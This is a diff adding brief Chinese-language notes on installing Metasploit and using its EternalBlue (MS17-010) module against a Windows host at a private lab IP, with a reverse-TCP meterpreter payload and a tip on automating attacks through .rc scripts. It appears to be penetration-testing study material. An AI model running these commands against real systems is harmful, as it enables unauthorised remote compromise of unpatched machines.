@@ -1,0 +1,22 @@
+安装MSF
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
+
+升级：msfupdate
+
+添加MSF用户：adduser msf
+切换到msf用户： su msf
+切换到msf目录：cd /opt/metasploit-framework/bin
+./msfconsole
+环境变量：ln -s /opt/metasploit-framework/bin/msfconsole /usr/bin/msfconsole
+
+进入框架:msfconsole
+使用search命令查找相关漏洞:  search ms17-010
+使用use进入模块: use exploit/windows/smb/ms17_010_eternalblue
+使用info查看模块信息: info
+设置攻击载荷:  set payload windows/x64/meterpreter/reverse_tcp
+查看模块需要配置的参数: show options
+设置参数: set RHOST 192.168.125.138
+攻击: exploit/ run
+后渗透阶段
+
+我们也可以将攻击代码写入 configure.rc(只要是以.rc 结尾的文件)配置文件中，然后使用命令msfconsole -rconfigure.rc 进行自动攻击!
